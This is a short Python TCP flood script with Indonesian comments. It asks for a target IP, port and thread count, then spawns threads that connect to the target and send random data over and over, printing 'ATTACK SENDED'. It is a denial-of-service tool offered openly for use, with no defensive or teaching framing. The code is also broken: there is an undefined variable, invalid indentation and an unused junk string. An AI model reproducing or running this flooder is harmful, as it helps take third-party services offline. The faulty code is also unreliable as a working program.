#Simple TCPFlood in python
#Free ya tpi jngn diperjual belikan
#Setelah ini gw gk akan update toolsnya :v

#Import Module
import socket
import threading
import random

ip = str(input("Enter IP: "))
port = int(input("Enter Port: "))
time = int(input("Enter Time: "))
thread = int(input("Enter Thread: "))

bypassc = "OST.HEADER-DATAMAX{SEND{}DATA} EXPLATOR"
connections = "Connection: Keep-Alive\r\n"

def TCPFlood():
    tcp_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    avi = random._urandom(5025)
    while True:
     try:
         tcp_socket.connect((ip,port))
         tcp_socket.send(avi)
         tcp_socket.send(avi)
         tcp_socket.send(avi)
         for _ in range(times):
             tcp_socket.sendall(avi)
             tcp_socket.sendall(avi)
             tcp_socket.sendall(avi)
             print(f"ATTACK SENDED TO {ip}:{port}")
      except socket.error:
      print(f"ATTACK SENDED TO {ip}:{port}")
      tcp_socket.close()
      
for y in range(thread):
    th = threading.Thread(target=TCPFlood)
    th.start()
         
    